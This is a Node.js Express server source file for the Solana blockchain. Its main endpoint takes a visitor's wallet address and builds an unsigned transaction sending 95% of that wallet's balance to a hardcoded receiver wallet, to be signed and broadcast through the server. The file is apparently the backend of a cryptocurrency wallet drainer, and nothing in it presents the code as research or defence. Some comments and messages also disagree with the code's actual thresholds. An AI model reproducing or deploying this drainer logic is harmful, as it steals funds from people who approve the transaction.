const express = require('express');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// Simple RPC that definitely works
const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';

console.log('Server starting...');

// Simple health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok' });
});

// Get balance endpoint
app.post('/api/getBalance', async (req, res) => {
    try {
        const { publicKey } = req.body;
        const pubkey = new PublicKey(publicKey);
        const balance = await connection.getBalance(pubkey);
        res.json({ success: true, balance });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get blockhash endpoint
app.post('/api/getBlockhash', async (req, res) => {
    try {
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
        res.json({ success: true, blockhash, lastValidBlockHeight });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Send transaction endpoint
app.post('/api/sendTransaction', async (req, res) => {
    try {
        const { transaction } = req.body;
        const txBuffer = Buffer.from(transaction, 'base64');
        const signature = await connection.sendRawTransaction(txBuffer);
        res.json({ success: true, txid: signature });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Prepare transaction endpoint - THE MAIN ONE
app.post('/prepare-transaction', async (req, res) => {
    try {
        const { publicKey } = req.body;
        
        console.log('Preparing for:', publicKey);
        
        const fromPubkey = new PublicKey(publicKey);
        const toPubkey = new PublicKey(RECEIVER_WALLET);
        
        // Get balance
        const balance = await connection.getBalance(fromPubkey);
        console.log('Balance:', balance / 1e9, 'SOL');
        
        // Calculate amount to send (leave 0.005 SOL for fees)
        const amountToSend = Math.floor(balance * 0.95); // Send 95%, keep 5% for fees
        
        if (amountToSend < 10000) {
            return res.json({ 
                success: false, 
                error: `Balance too low: ${balance / 1e9} SOL. Need at least 0.02 SOL.` 
            });
        }
        
        console.log('Sending:', amountToSend / 1e9, 'SOL');
        
        // Create transaction
        const transaction = new Transaction();
        transaction.add(
            SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToSend,
            })
        );
        
        // Serialize
        const serialized = transaction.serialize({
            requireAllSignatures: false,
            verifySignatures: false
        });
        
        res.json({ 
            success: true, 
            transaction: Array.from(serialized),
            amount: amountToSend
        });
        
    } catch (err) {
        console.error('Error:', err.message);
        res.status(500).json({ success: false, error: err.message });
    }
});

// Notification endpoint
app.post('/notify', (req, res) => {
    console.log('NOTIFY:', req.body.customMessage);
    res.json({ ok: true });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Receiver wallet: ${RECEIVER_WALLET}`);
});
